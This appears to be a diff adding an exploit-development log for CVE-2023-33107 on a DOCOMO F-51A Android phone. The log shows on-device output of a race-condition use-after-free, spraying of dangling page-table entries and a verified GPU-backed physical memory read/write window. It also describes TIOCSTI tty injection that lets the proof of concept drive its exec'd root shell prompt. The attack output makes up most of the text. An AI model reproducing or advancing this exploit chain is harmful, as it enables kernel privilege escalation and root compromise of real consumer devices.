@@ -1,0 +1,65 @@
+F-51A V71R051A — read-only self-test of the single-binary build
+Date: 2026-10-15
+Fingerprint: DOCOMO/F51A/F51A:12/V71R051A/F51A.20230213:user/release-keys
+Kernel: 4.19.136+
+Artifact: out/cve-2023-33107-f51a
+  475ef11f19deead36ccafc783496f3edc1ad73a67e2c460edc5c0a0333788409
+Command: ./run.sh --self-test
+Start state: uid=2000(shell), SELinux Enforcing
+
+--- auxiliary mode merged into the same binary ---
+$ /data/local/tmp/cve-2023-33107-f51a --mempressure 256
+touched=0/256 MiB
+READY pid=14284 size=256 MiB
+
+--- run.sh --self-test (tail) ---
+[9] OVERLAP mmap() at FIXED 0x7001fe000 during race
+    OVERLAP mmap result: FAILED
+      errno=19 (No such device)
+
+[!] RACE CONDITION WON!
+[10] Freeing UAF to create dangling PTEs
+    UAF freed (id=1)
+
+[+] Preparing GPU-backed physical inspection window
+[13] mmap-spraying user VA space
+
+[+] Scanning UAF region for non-zero pages
+    Region: 0x7001ff000 ~ 0x710203000
+    [+] IB GPU=0x7ffff8000, DST GPU=0x7ffff7000
+non_zero == 10
+vic_pte 6e587f53 e80002cur_VA : 70022f000
+      [*] CP_MEM_WRITE: mirrored PTE 0x8 -> 0x0 on VA 0x70022f000 (F53 suffix)
+    [!] Found page with == 10 non-zero dwords @ VA 0x70022f000 (10/1024)
+    [*] Scan done: scanned 49 pages, collected 1 pages
+    [+] PTE GPU alias=0x70022f000 user victim=0x653801000
+    [*] physical-window self-test original=0x26e587000 value=1 mirror=0x26e588000 value=3
+Exit status: 0
+
+--- state after the run (separate ordinary adb shell) ---
+$ getenforce; id -u; uptime
+Enforcing
+2000
+ 09:43:55 up 15:31,  0 users,  load average: 3.26, 3.45, 3.15
+
+The race was won and the physical read/write window was established and
+verified, confirming the vulnerable primitive on this build. SELinux stayed
+Enforcing, the process stayed uid 2000, and the 15-hour uptime shows the
+kernel did not panic: --self-test changes no kernel state, as documented.
+
+This run exercised the reorganised tree end to end: Makefile -> build.sh ->
+one artifact -> run.sh fingerprint gate -> on-device execution.
+
+--- handover prompt fix: TIOCSTI availability on this build ---
+Date: 2026-10-15
+Context: u:r:shell:s0, uid 2000, SELinux Enforcing, real adb PTY (adb shell -t -t)
+
+$ ./tiocsti_probe
+isatty(0)=1
+
+TIOCSTI OK: a newline is now queued in the tty input
+
+The blank line above the result is the injected newline echoed by the terminal,
+confirming the byte reached the tty input queue. The PoC now performs this
+injection itself immediately after handing the tty to the exec'd root shell, so
+mksh takes its first read and draws the prompt without operator input.
